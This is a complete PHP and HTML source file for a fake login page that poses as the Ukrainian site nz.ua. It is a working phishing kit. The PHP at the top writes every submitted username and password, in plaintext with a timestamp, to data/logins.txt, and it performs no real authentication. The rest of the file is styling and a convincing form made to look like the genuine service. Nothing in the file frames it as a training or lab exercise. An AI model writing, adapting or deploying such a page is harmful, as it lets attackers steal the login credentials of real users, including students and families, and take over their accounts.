<?php
// index.php — ОДИН файл із формою та збереженням у TXT

// Показувати помилки під час налаштування (можна вимкнути пізніше)
error_reporting(E_ALL);
ini_set('display_errors', 1);

$status = null;  // повідомлення для користувача

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = trim($_POST['username'] ?? '');
    $password = trim($_POST['password'] ?? '');

    if ($username === '' || $password === '') {
        $status = ['type' => 'error', 'text' => ''];
    } else {
        // Папка для файлу з логінами
        $dir = __DIR__ . '/data';
        if (!is_dir($dir)) {
            @mkdir($dir, 0775, true);
        }

        if (!is_writable($dir)) {
            $status = ['type' => 'error', 'text' => ''  ];
        } else {
            $file = $dir . '/logins.txt';
            $line = sprintf("%s | Логін: %s | Пароль: %s\n", date('Y-m-d H:i:s'), $username, $password);
            $ok = @file_put_contents($file, $line, FILE_APPEND | LOCK_EX);
            if ($ok === false) {
                $status = ['type' => 'error', 'text' => '' . htmlspecialchars($file)];
            } else {
                $status = ['type' => 'ok', 'text' => ''];
            }
        }
    }
}
?>
<!doctype html>
<html lang="uk">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Вхід на сайт — nz.ua</title>
  <style>
    :root{
      --bg:#000;
      --fg:#fff;
      --muted:#aaa;
      --accent:#19c37d;
      --stroke:#555;
      --ok: #19c37d;
      --err: #ef4444;
    }
    *{box-sizing:border-box}
    body{
      margin:10;
      background:var(--bg);
      color:var(--fg);
      font-family:system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
      display:flex;
      flex-direction:column;
      min-height:100vh;
    }
    header{
      padding: 15px 40px;
      display:flex;
      justify-content:space-between;
      align-items:center;
    }
    .brand{
      display:flex; align-items:center; gap:10px;
      color:var(--fg); text-decoration:none;
      margin-left:300px;
    }
    .logo{
      width:40px; height:40px; border-radius:10px;
      background:conic-gradient(from 210deg, #a78bfa, #60a5fa, #34d399, #f59e0b, #ef4444, #a78bfa);
      display:grid; place-items:center;
      flex-shrink:0;
    }
    .logo::after{content:""; width:16px; height:16px; background:var(--bg); border-radius:4px}
    .close-btn{
      font-size:28px;
      color:var(--fg);
      text-decoration:none;
      line-height:1;
    }
    .close-btn:hover{opacity:0.7}
    main{
      flex:1;
      display:flex;
      justify-content:center;
      align-items:flex-start;
      padding:80px 40px;
    }
    .login-box{ width:100%; max-width:500px; }
    h1{
      text-align:left;
      font-size:50px;
      margin-bottom:24px;
    }
    
    
    
    .field{margin-bottom:26px}
    .input{
      width:100%;
      background:transparent;
      border:none;
      border-bottom:1px solid var(--stroke);
      padding:10px 0;
      font-size:16px;
      color:var(--fg);
      outline:none;
      text-align:left;
    }
    .row{
      display:flex;
      align-items:center;
      gap:8px;
      margin:20px 0;
    }
    .row label{font-size:14px}
    .actions{
      display:flex;
      justify-content:flex-start;
      align-items:center;
      gap:30px;
    }
    header{
      padding:20px 40px;
      display:flex;
      justify-content:10px;
      align-items:center;
      gap:20px;
    }
    .btn{
      background:var(--fg);
      color:var(--bg);
      border:none;
      padding:10px 20px;
      border-radius:20px;
      font-size:15px;
      cursor:pointer;
      font-weight:500;
    }
    .btn:hover{opacity:.9}
    .muted{
      font-size:16px;
      color:var(--muted);
    }
    .muted a{
      color:var(--accent);
      text-decoration:none;
    }
    .muted a:hover{text-decoration:underline}
    .input:focus{border-bottom-color:#888}
  </style>
</head>
<body>
  <header>
    <a href="#" class="brand" aria-label="nz.ua">
      <img src="logo.svg" alt="Логотип" class="logo">
      <span>nz.ua</span>
    </a>
    <a href="#" class="close-btn" aria-label="Закрити">✕</a>
  </header>

  <main>
    <div class="login-box">
      <h1>Вхід на сайт</h1>

      <?php if ($status): ?>
        <div class="status <?= $status['type']==='ok' ? 'ok' : 'err' ?>">
          <?= htmlspecialchars($status['text'], ENT_QUOTES, 'UTF-8') ?>
        </div>
      <?php endif; ?>

      <form action="" method="POST" autocomplete="off">
        <div class="field">
          <input class="input" type="text" name="username" placeholder="Ім'я користувача або e-mail" required />
        </div>
        <div class="field">
          <input class="input" type="password" name="password" placeholder="Пароль" required />
        </div>
        <div class="row">
          <input type="checkbox" id="remember" name="remember" />
          <label for="remember">Запам'ятати мене</label>
        </div>
        <div class="actions">
          <button class="btn" type="submit">Увійти до кабінету</button>
          <p class="muted">Забули пароль? <a href="#">Нагадати</a></p>
        </div>
      </form>
    </div>
  </main>
</body>
</html>
